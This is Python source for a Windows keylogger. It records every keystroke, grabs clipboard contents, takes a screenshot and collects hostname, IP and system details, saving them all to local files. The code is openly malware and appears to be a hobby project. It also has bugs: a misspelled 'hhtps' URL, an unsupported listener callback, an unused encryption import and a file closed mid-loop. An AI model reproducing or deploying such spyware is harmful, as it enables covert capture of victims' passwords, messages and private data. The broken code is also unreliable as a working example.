# Importing Libraries
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_info = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "Clip.txt"
ss_info = "Screenshot.png"
time_iteration = 25
number_of_iterations_end = 5

file_path = "C:\\Users\\R1K1\\Documents\\Pyhton Project\\project"  # ADD YOUR FILE PATH
extend = "\\"


# COMPUTER INFORMATION
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("hhtps://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Processor: " + (platform.processor()) + "\n")
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")


computer_info()


# COPIED AND PASTED INFORMATION
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_info = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_info)

        except:
            f.write("Clipboard could not be copied")


copy_clipboard()


# SCREENSHOT
def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + extend + ss_info)


screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as x:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    x.write("\n")
                    x.close()
                elif k.find("key") == -1:
                    x.write(k)
                    x.close()

    def on_escape(key):
        if key == key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_escape=on_escape) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        copy_clipboard()

        number_of_iterations += 1
